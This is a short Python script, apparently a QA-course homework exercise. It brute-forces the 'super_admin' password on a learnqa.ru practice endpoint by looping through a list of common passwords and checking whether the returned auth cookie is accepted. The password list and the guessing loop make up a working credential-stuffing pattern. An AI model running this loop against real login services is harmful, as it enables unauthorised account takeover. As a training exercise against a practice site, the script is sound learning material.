import requests

arr_pas = ['1234', '12345', '111111', '121212', '123123', '123456', '555555', '654321', '666666', '696969', '888888', '1234567',
           '7777777', '12345678', '123456789', '1234567890', '!@#$%^&*', '123qwe', '1q2w3e4r', '1qaz2wsx', 'aa123456', 'abc123',
           'access', 'admin', 'adobe123', 'ashley', 'azerty', 'bailey', 'baseball', 'batman', 'charlie', 'donald', 'dragon', 'flower',
           'football', 'freedom', 'hello', 'hottie', 'iloveyou', 'jesus', 'letmein', 'login', 'lovely', 'loveme', 'master', 'michael',
           'monkey', 'mustang', 'ninja', 'passw0rd', 'password', 'password1', 'photoshop', 'princess', 'qazwsx', 'qwerty', 'qwerty123',
           'qwertyuiop', 'shadow', 'solo', 'starwars', 'sunshine', 'superman', 'trustno1', 'welcome', 'whatever', 'zaq1zaq1']

print("Идет проверка, ждите..")
print("")

for i in arr_pas:
    password = {"login":"super_admin", "password":f"{i}"}
    r1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=password)

    cookie_value = r1.cookies.get('auth_cookie')
    cookies = {'auth_cookie' : cookie_value}

    r2 = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)

    if r2.text == 'You are authorized':
        print(r2.text)
        print(password)
